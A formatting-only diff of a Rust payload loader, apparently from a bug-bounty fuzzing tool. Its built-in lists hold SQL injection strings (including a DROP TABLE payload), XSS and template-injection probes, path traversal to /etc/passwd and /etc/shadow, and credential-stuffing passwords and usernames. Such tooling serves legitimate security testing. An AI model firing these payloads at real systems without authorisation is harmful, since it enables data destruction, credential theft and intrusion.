@@ -9,7 +9,7 @@
  *                  All built-in payloads are tuned for bug bounty; no DoS lists.
  *******************************************************************/
 
-use anyhow::{bail, Result};
+use anyhow::{Result, bail};
 
 // Load a named built-in payload set or a file path
 // Dispatch rule: "numbers:N-M" → range, "file:path" or direct path → file, else built-in name
@@ -30,8 +30,14 @@ fn load_range(spec: &str) -> Result<Vec<String>> {
     if parts.len() != 2 {
         bail!("range format must be N-M (e.g. numbers:1-100)");
     }
-    let start: i64 = parts[0].trim().parse().map_err(|_| anyhow::anyhow!("invalid range start"))?;
-    let end: i64   = parts[1].trim().parse().map_err(|_| anyhow::anyhow!("invalid range end"))?;
+    let start: i64 = parts[0]
+        .trim()
+        .parse()
+        .map_err(|_| anyhow::anyhow!("invalid range start"))?;
+    let end: i64 = parts[1]
+        .trim()
+        .parse()
+        .map_err(|_| anyhow::anyhow!("invalid range end"))?;
     if end < start {
         bail!("range end must be >= start");
     }
@@ -44,7 +50,8 @@ fn load_range(spec: &str) -> Result<Vec<String>> {
 fn load_file(path: &str) -> Result<Vec<String>> {
     let raw = std::fs::read_to_string(path)
         .map_err(|e| anyhow::anyhow!("cannot read payload file {path}: {e}"))?;
-    Ok(raw.lines()
+    Ok(raw
+        .lines()
         .map(str::trim)
         .filter(|l| !l.is_empty() && !l.starts_with('#'))
         .map(String::from)
@@ -56,10 +63,20 @@ fn load_builtin(name: &str) -> Result<Vec<String>> {
     let payloads: &[&str] = match name {
         // SQL injection: classical and blind patterns
         "sqli" => &[
-            "'", "''", "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--",
-            "\" OR \"1\"=\"1", "1' AND SLEEP(5)--", "1; DROP TABLE users--",
-            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
-            "admin'--", "' OR 'x'='x", "1 OR 1=1", "' AND 1=2--",
+            "'",
+            "''",
+            "' OR '1'='1",
+            "' OR '1'='1'--",
+            "' OR 1=1--",
+            "\" OR \"1\"=\"1",
+            "1' AND SLEEP(5)--",
+            "1; DROP TABLE users--",
+            "' UNION SELECT NULL--",
+            "' UNION SELECT NULL,NULL--",
+            "admin'--",
+            "' OR 'x'='x",
+            "1 OR 1=1",
+            "' AND 1=2--",
         ],
         // Cross-site scripting
         "xss" => &[
@@ -70,21 +87,34 @@ fn load_builtin(name: &str) -> Result<Vec<String>> {
             "\"><script>alert(1)</script>",
             "';alert(1)//",
             "<iframe src=javascript:alert(1)>",
-            "{{7*7}}",  // also catches SSTI
+            "{{7*7}}", // also catches SSTI
             "${7*7}",
         ],
         // Server-side template injection
         "ssti" => &[
-            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
-            "{{config}}", "{{self}}", "${{7*7}}", "{7*7}",
-            "{% debug %}", "{{''.__class__.__mro__}}",
+            "{{7*7}}",
+            "${7*7}",
+            "<%= 7*7 %>",
+            "#{7*7}",
+            "{{config}}",
+            "{{self}}",
+            "${{7*7}}",
+            "{7*7}",
+            "{% debug %}",
+            "{{''.__class__.__mro__}}",
         ],
         // Path traversal and LFI
         "traversal" => &[
-            "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
-            "../../../../etc/passwd", "..%2Fetc%2Fpasswd",
-            "%2e%2e%2fetc%2fpasswd", "..\\..\\windows\\win.ini",
-            "/etc/passwd", "/etc/shadow", "/proc/self/environ",
+            "../etc/passwd",
+            "../../etc/passwd",
+            "../../../etc/passwd",
+            "../../../../etc/passwd",
+            "..%2Fetc%2Fpasswd",
+            "%2e%2e%2fetc%2fpasswd",
+            "..\\..\\windows\\win.ini",
+            "/etc/passwd",
+            "/etc/shadow",
+            "/proc/self/environ",
             "....//....//etc/passwd",
         ],
         // SSRF test payloads — use with an OOB host
@@ -101,23 +131,51 @@ fn load_builtin(name: &str) -> Result<Vec<String>> {
         ],
         // Common weak passwords for credential stuffing tests
         "common-passwords" => &[
-            "password", "123456", "password1", "admin", "letmein",
-            "welcome", "monkey", "dragon", "qwerty", "abc123",
-            "1234567", "12345678", "sunshine", "princess", "iloveyou",
-            "1234567890", "password123", "admin123", "test", "guest",
+            "password",
+            "123456",
+            "password1",
+            "admin",
+            "letmein",
+            "welcome",
+            "monkey",
+            "dragon",
+            "qwerty",
+            "abc123",
+            "1234567",
+            "12345678",
+            "sunshine",
+            "princess",
+            "iloveyou",
+            "1234567890",
+            "password123",
+            "admin123",
+            "test",
+            "guest",
         ],
         // HTTP methods for verb tampering
         "http-methods" => &[
-            "GET", "POST", "PUT", "PATCH", "DELETE",
-            "HEAD", "OPTIONS", "TRACE", "CONNECT",
+            "GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE", "CONNECT",
         ],
         // Common admin/API usernames
         "usernames" => &[
-            "admin", "administrator", "root", "superuser", "sysadmin",
-            "test", "guest", "user", "api", "service", "daemon",
-            "manager", "operator", "support",
+            "admin",
+            "administrator",
+            "root",
+            "superuser",
+            "sysadmin",
+            "test",
+            "guest",
+            "user",
+            "api",
+            "service",
+            "daemon",
+            "manager",
+            "operator",
+            "support",
         ],
-        _ => bail!("unknown built-in payload set '{name}'; available: sqli xss ssti traversal ssrf common-passwords http-methods usernames numbers:N-M"),
+        _ => bail!(
+            "unknown built-in payload set '{name}'; available: sqli xss ssti traversal ssrf common-passwords http-methods usernames numbers:N-M"
+        ),
     };
     Ok(payloads.iter().map(|s| s.to_string()).collect())
 }
